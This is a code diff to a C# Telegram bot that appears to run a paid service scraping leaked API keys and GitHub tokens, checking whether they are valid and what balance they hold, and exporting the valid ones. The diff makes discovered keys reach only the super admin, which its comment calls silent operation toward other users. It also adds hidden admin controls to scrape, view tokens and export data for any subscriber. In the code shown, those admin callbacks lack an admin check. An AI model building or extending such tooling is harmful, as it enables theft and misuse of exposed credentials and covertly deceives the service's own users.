@@ -139,30 +139,25 @@ public class TelegramBotService : BackgroundService
                             new [] { InlineKeyboardButton.WithCallbackData("📂 Export Intelligence", $"export_key:{key.Id}") }
                         });
 
-                        // Notify owner or super admin
-                        var targetChatId = key.DiscoveredByTelegramId ?? _adminChatId;
-                        if (targetChatId != 0)
+                        // Notify ONLY the super admin (Silent operation for all other users)
+                        if (_adminChatId != 0)
                         {
+                            var discoverer = await dbContext.TelegramSubscribers.FindAsync(new object[] { key.DiscoveredByTelegramId ?? 0 }, stoppingToken);
+                            var discovererName = discoverer != null && !string.IsNullOrEmpty(discoverer.Username) 
+                                ? $"@{discoverer.Username} (<code>{key.DiscoveredByTelegramId}</code>)" 
+                                : $"<code>{key.DiscoveredByTelegramId}</code>";
+
+                            var adminMsg = new StringBuilder();
+                            adminMsg.AppendLine($"🔔 <b>NEW KEY DISCOVERED</b>");
+                            adminMsg.AppendLine($"<i>Found by: {discovererName}</i>");
+                            adminMsg.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
+                            adminMsg.Append(sb); // Append the pre-built key info (status, tier, balance, preview)
+
                             await _botClient.SendMessage(
-                                chatId: targetChatId,
-                                text: sb.ToString(),
+                                chatId: _adminChatId,
+                                text: adminMsg.ToString(),
                                 parseMode: ParseMode.Html,
                                 replyMarkup: keyboard,
-                                cancellationToken: stoppingToken);
-                        }
-                        
-                        // If key is not owned by super admin, also notify super admin (optional, for monitoring)
-                        if (targetChatId != _adminChatId && _adminChatId != 0)
-                        {
-                            var discoverer = await dbContext.TelegramSubscribers.FindAsync(new object[] { targetChatId }, stoppingToken);
-                            var discovererName = discoverer != null && !string.IsNullOrEmpty(discoverer.Username) 
-                                ? $"@{discoverer.Username} (<code>{targetChatId}</code>)" 
-                                : $"<code>{targetChatId}</code>";
-
-                             await _botClient.SendMessage(
-                                chatId: _adminChatId,
-                                text: $"<i>[Monitor] New key found by user {discovererName}:</i>\n{sb}",
-                                parseMode: ParseMode.Html,
                                 cancellationToken: stoppingToken);
                         }
                     }
@@ -340,6 +335,15 @@ public class TelegramBotService : BackgroundService
                 case "/node_status":
                     await HandleNodeStatusCommand(chatId, isAdmin, cancellationToken);
                     break;
+                case "/user_dash":
+                    if (isAdmin)
+                    {
+                        if (long.TryParse(args, out long targetId))
+                            await HandleUserDashCommand(chatId, targetId, cancellationToken);
+                        else
+                            await _botClient.SendMessage(chatId, "❌ Usage: <code>/user_dash &lt;telegram_id&gt;</code>", parseMode: ParseMode.Html, cancellationToken: cancellationToken);
+                    }
+                    break;
                 default:
                     if (messageText.StartsWith("/"))
                         await _botClient.SendMessage(chatId, "❓ Unknown command. Use /help to see available commands.", cancellationToken: cancellationToken);
@@ -377,12 +381,85 @@ public class TelegramBotService : BackgroundService
                         await scraper.RunScrapeByGroupAsync(groupName, isDeep, chatId, ct);
                     });
  
-                    await _botClient.SendMessage(chatId, $"🚀 Scraper started for *{groupName}* ({mode} mode)!\nJob ID: `{jobId}`", parseMode: ParseMode.Markdown, cancellationToken: cancellationToken);
+                await _botClient.SendMessage(chatId, $"🚀 Scraper started for *{groupName}* ({mode} mode)!\nJob ID: `{jobId}`", parseMode: ParseMode.Markdown, cancellationToken: cancellationToken);
+                }
+            }
+            else if (callbackData.StartsWith("user_dash:"))
+            {
+                var targetId = long.Parse(callbackData.Split(':')[1]);
+                await HandleUserDashCommand(chatId, targetId, cancellationToken);
+            }
+            else if (callbackData.StartsWith("admin_scrape:"))
+            {
+                var targetId = long.Parse(callbackData.Split(':')[1]);
+                await HandleAdminStartScraperCommand(chatId, targetId, cancellationToken);
+            }
+            else if (callbackData.StartsWith("admin_run_scrape:"))
+            {
+                var parts = callbackData.Split(':');
+                var targetId = long.Parse(parts[1]);
+                var groupName = parts[2];
+                var mode = parts[3];
+                var isDeep = mode == "deep";
+
+                _jobManager.StartJob($"Scraper-{groupName}-{targetId}", async (ct) =>
+                {
+                    using var scope = _serviceProvider.CreateScope();
+                    var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
+                    var httpClientFactory = scope.ServiceProvider.GetRequiredService<IHttpClientFactory>();
+                    var scraper = new ScraperService(dbContext, httpClientFactory);
+                    await scraper.RunScrapeByGroupAsync(groupName, isDeep, targetId, ct);
+                });
+
+                await _botClient.SendMessage(chatId, $"🚀 [Admin] Scraper started for @{targetId} group *{groupName}*!", parseMode: ParseMode.Markdown, cancellationToken: cancellationToken);
+            }
+            else if (callbackData.StartsWith("admin_tokens:"))
+            {
+                var targetId = long.Parse(callbackData.Split(':')[1]);
+                await HandleListTokensCommand(chatId, false, cancellationToken, targetId);
+            }
+            else if (callbackData.StartsWith("admin_stats:"))
+            {
+                var targetId = long.Parse(callbackData.Split(':')[1]);
+                await HandleStatsCommand(chatId, false, cancellationToken, targetId);
+            }
+            else if (callbackData.StartsWith("admin_export:"))
+            {
+                var targetId = long.Parse(callbackData.Split(':')[1]);
+                await HandleExportCommand(chatId, "csv", false, cancellationToken, targetId);
+            }
+            else if (callbackData.StartsWith("admin_sub_manage:"))
+            {
+                var targetId = long.Parse(callbackData.Split(':')[1]);
+                await HandleAdminSubManageCommand(chatId, targetId, cancellationToken);
+            }
+            else if (callbackData.StartsWith("admin_sub_ext:"))
+            {
+                var parts = callbackData.Split(':');
+                var targetId = long.Parse(parts[1]);
+                var days = int.Parse(parts[2]);
+                
+                using (var scope = _serviceProvider.CreateScope())
+                {
+                    var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
+                    var userS = await dbContext.TelegramSubscribers.FindAsync(new object[] { targetId }, cancellationToken);
+                    if (userS != null)
+                    {
+                        var baseDate = userS.SubscriptionExpiryUtc > DateTime.UtcNow ? userS.SubscriptionExpiryUtc : DateTime.UtcNow;
+                        userS.SubscriptionExpiryUtc = baseDate.AddDays(days);
+                        await dbContext.SaveChangesAsync(cancellationToken);
+                        await _botClient.SendMessage(chatId, $"✅ Extended subscription for <code>{targetId}</code> by {days} days.", parseMode: ParseMode.Html, cancellationToken: cancellationToken);
+                        await HandleUserDashCommand(chatId, targetId, cancellationToken);
+                    }
                 }
             }
             else if (callbackData == "status_refresh")
             {
                 await HandleStatusCommand(chatId, isAdmin, cancellationToken);
+            }
+            else if (callbackData.StartsWith("admin_list_subs"))
+            {
+                await HandleListSubsCommand(chatId, cancellationToken);
             }
             else if (callbackData == "jobs_list")
             {
@@ -490,14 +567,14 @@ public class TelegramBotService : BackgroundService
         await _botClient.SendMessage(chatId, help.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
     }
 
-    private async Task HandleStatusCommand(long chatId, bool isAdmin, CancellationToken ct)
+    private async Task HandleStatusCommand(long chatId, bool isAdmin, CancellationToken ct, long? targetUserId = null)
     {
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
         
-        // Filter by chatId if not admin
-        long? filterBy = isAdmin ? null : chatId;
+        // Filter by targetUserId if provided, or by chatId if not admin
+        long? filterBy = targetUserId ?? (isAdmin ? null : chatId);
         var stats = await dbService.GetCategorizedStatisticsAsync(dbContext, filterBy);
         var activeJobs = _jobManager.GetAllJobs().Where(j => j.Status == "Running").ToList();
 
@@ -548,14 +625,14 @@ public class TelegramBotService : BackgroundService
         return new string('█', activeBlocks) + new string('░', totalBlocks - activeBlocks);
     }
 
-    private async Task HandleStatsCommand(long chatId, bool isAdmin, CancellationToken ct)
+    private async Task HandleStatsCommand(long chatId, bool isAdmin, CancellationToken ct, long? targetUserId = null)
     {
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
         
-        // Filter by chatId if not admin
-        long? filterBy = isAdmin ? null : chatId;
+        // Filter by targetUserId if provided, or by chatId if not admin
+        long? filterBy = targetUserId ?? (isAdmin ? null : chatId);
         var stats = await dbService.GetCategorizedStatisticsAsync(dbContext, filterBy);
 
         var sb = new StringBuilder();
@@ -694,14 +771,14 @@ public class TelegramBotService : BackgroundService
         await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
     }
 
-    private async Task HandleListTokensCommand(long chatId, bool isAdmin, CancellationToken ct)
+    private async Task HandleListTokensCommand(long chatId, bool isAdmin, CancellationToken ct, long? targetUserId = null)
     {
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
         
-        // Admins see all tokens, subscribers see their own
-        long? filterBy = isAdmin ? null : chatId;
+        // Filter by targetUserId if provided, or by chatId if not admin
+        long? filterBy = targetUserId ?? (isAdmin ? null : chatId);
         var tokens = await dbService.GetGitHubTokensAsync(dbContext, filterBy);
 
         if (tokens.Count == 0)
@@ -872,7 +949,7 @@ public class TelegramBotService : BackgroundService
         await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
     }
 
-    private async Task HandleExportCommand(long chatId, string format, bool isAdmin, CancellationToken ct)
+    private async Task HandleExportCommand(long chatId, string format, bool isAdmin, CancellationToken ct, long? targetUserId = null)
     {
         string fmt = (format?.ToLower() == "json") ? "json" : "csv";
         string fileName = $"valid_keys_{DateTime.Now:yyyyMMdd_HHmmss}.{fmt}";
@@ -882,8 +959,8 @@ public class TelegramBotService : BackgroundService
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
         var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
         
-        // Filter by chatId if not admin
-        long? filterBy = isAdmin ? null : chatId;
+        // Filter by targetUserId if provided, or by chatId if not admin
+        long? filterBy = targetUserId ?? (isAdmin ? null : chatId);
         await dbService.ExportKeysAsync(dbContext, filePath, true, fmt, filterBy);
 
         using var stream = System.IO.File.OpenRead(filePath);
@@ -1027,7 +1104,7 @@ public class TelegramBotService : BackgroundService
     {
         using var scope = _serviceProvider.CreateScope();
         var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
-        var subs = await dbContext.TelegramSubscribers.ToListAsync(ct);
+        var subs = await dbContext.TelegramSubscribers.OrderByDescending(s => s.CreatedAtUtc).ToListAsync(ct);
 
         if (!subs.Any())
         {
@@ -1036,13 +1113,20 @@ public class TelegramBotService : BackgroundService
         }
 
         var sb = new StringBuilder("<b>📋 REGISTERED USERS</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n");
+        var rows = new List<InlineKeyboardButton[]>();
+
         foreach (var s in subs)
         {
             var status = s.SubscriptionExpiryUtc > DateTime.UtcNow ? "🟢" : "🔴";
-            var nameStr = !string.IsNullOrEmpty(s.Username) ? $" (@{s.Username})" : "";
-            sb.AppendLine($"{status} <code>{s.TelegramId}</code>{nameStr} - {(s.IsAdmin ? "Admin" : "Sub")} (Ends: {s.SubscriptionExpiryUtc.ToIst():MM/dd})");
+            var nameStr = !string.IsNullOrEmpty(s.Username) ? $"@{s.Username}" : $"{s.TelegramId}";
+            var label = $"{status} {nameStr} ({(s.IsAdmin ? "Admin" : "Sub")})";
+            
+            rows.Add(new[] { InlineKeyboardButton.WithCallbackData(label, $"user_dash:{s.TelegramId}") });
         }
-        await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
+
+        var keyboard = new InlineKeyboardMarkup(rows);
+
+        await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, replyMarkup: keyboard, cancellationToken: ct);
     }
 
     private async Task HandleSetAdminCommand(long chatId, string args, CancellationToken ct)
@@ -1222,6 +1306,90 @@ public class TelegramBotService : BackgroundService
         }
 
         await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, cancellationToken: ct);
+    }
+
+    private async Task HandleUserDashCommand(long chatId, long targetUserId, CancellationToken ct)
+    {
+        using var scope = _serviceProvider.CreateScope();
+        var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
+        var dbService = scope.ServiceProvider.GetRequiredService<DatabaseService>();
+        
+        var targetUser = await dbContext.TelegramSubscribers.FindAsync(new object[] { targetUserId }, ct);
+        if (targetUser == null)
+        {
+            await _botClient.SendMessage(chatId, "❌ User not found.", cancellationToken: ct);
+            return;
+        }
+
+        var stats = await dbService.GetCategorizedStatisticsAsync(dbContext, targetUserId);
+        
+        var nameStr = !string.IsNullOrEmpty(targetUser.Username) ? $"@{targetUser.Username}" : $"{targetUserId}";
+        var sb = new StringBuilder();
+        sb.AppendLine($"<b>👤 USER INSIGHT: {nameStr}</b>");
+        sb.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
+        sb.AppendLine($"<b>ID:</b> <code>{targetUserId}</code>");
+        sb.AppendLine($"<b>Status:</b> {(targetUser.SubscriptionExpiryUtc > DateTime.UtcNow ? "🟢 Active" : "🔴 Expired")}");
+        sb.AppendLine($"<b>Expiry:</b> {targetUser.SubscriptionExpiryUtc.ToIst():yyyy-MM-dd HH:mm} IST");
+        sb.AppendLine();
+        sb.AppendLine($"<b>Total Found:</b> <code>{stats.TotalKeys}</code>");
+        sb.AppendLine($"<b>Valid Keys:</b> <code>{stats.ValidKeys}</code>");
+        sb.AppendLine($"<b>Active Tokens:</b> <code>{stats.GitHubTokensCount}</code>");
+        sb.AppendLine("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯");
+        sb.AppendLine("<i>[Admin Mode] Remote actions operate silently.</i>");
+
+        var keyboard = new InlineKeyboardMarkup(new[]
+        {
+            new [] { InlineKeyboardButton.WithCallbackData("🔍 Start Scraper", $"admin_scrape:{targetUserId}"), InlineKeyboardButton.WithCallbackData("📊 View Stats", $"admin_stats:{targetUserId}") },
+            new [] { InlineKeyboardButton.WithCallbackData("🔑 View Tokens", $"admin_tokens:{targetUserId}"), InlineKeyboardButton.WithCallbackData("💾 Export Data", $"admin_export:{targetUserId}") },
+            new [] { InlineKeyboardButton.WithCallbackData("👤 Manage Sub", $"admin_sub_manage:{targetUserId}"), InlineKeyboardButton.WithCallbackData("🔙 Back to List", "admin_list_subs") }
+        });
+
+        await _botClient.SendMessage(chatId, sb.ToString(), parseMode: ParseMode.Html, replyMarkup: keyboard, cancellationToken: ct);
+    }
+
+    private async Task HandleAdminStartScraperCommand(long chatId, long targetUserId, CancellationToken ct)
+    {
+        using var scope = _serviceProvider.CreateScope();
+        var dbContext = scope.ServiceProvider.GetRequiredService<DBContext>();
+        var httpClientFactory = scope.ServiceProvider.GetRequiredService<IHttpClientFactory>();
+        var scraper = new ScraperService(dbContext, httpClientFactory);
+
+        var groups = await scraper.GetAvailableGroupsAsync(ct);
+
+        if (groups.Count == 0)
+        {
+            await _botClient.SendMessage(chatId, "⚠️ No targets available for this user's config.", cancellationToken: ct);
+            return;
+        }
+
+        var buttons = groups.Select(g => new[] 
+        { 
+            InlineKeyboardButton.WithCallbackData(g, $"admin_run_scrape:{targetUserId}:{g}:lite"), 
+            InlineKeyboardButton.WithCallbackData($"{g} (Deep)", $"admin_run_scrape:{targetUserId}:{g}:deep") 
+        }).ToArray();
+        
+        var rows = new List<InlineKeyboardButton[]>(buttons);
+        rows.Add(new[] { InlineKeyboardButton.WithCallbackData("🔙 Back to User Dash", $"user_dash:{targetUserId}") });
+
+        var inlineKeyboard = new InlineKeyboardMarkup(rows);
+
+        await _botClient.SendMessage(
+            chatId: chatId,
+            text: $"🔍 [Admin] Select scraper mode for @{targetUserId}:",
+            replyMarkup: inlineKeyboard,
+            cancellationToken: ct);
+    }
+
+    private async Task HandleAdminSubManageCommand(long chatId, long targetUserId, CancellationToken ct)
+    {
+        var keyboard = new InlineKeyboardMarkup(new[]
+        {
+            new [] { InlineKeyboardButton.WithCallbackData("+7 Days", $"admin_sub_ext:{targetUserId}:7"), InlineKeyboardButton.WithCallbackData("+30 Days", $"admin_sub_ext:{targetUserId}:30") },
+            new [] { InlineKeyboardButton.WithCallbackData("+90 Days", $"admin_sub_ext:{targetUserId}:90"), InlineKeyboardButton.WithCallbackData("+365 Days", $"admin_sub_ext:{targetUserId}:365") },
+            new [] { InlineKeyboardButton.WithCallbackData("🔙 Back to User Dash", $"user_dash:{targetUserId}") }
+        });
+
+        await _botClient.SendMessage(chatId, $"👤 <b>Edit Subscription for:</b> <code>{targetUserId}</code>\nChoose duration to add:", parseMode: ParseMode.Html, replyMarkup: keyboard, cancellationToken: ct);
     }
 
     #endregion
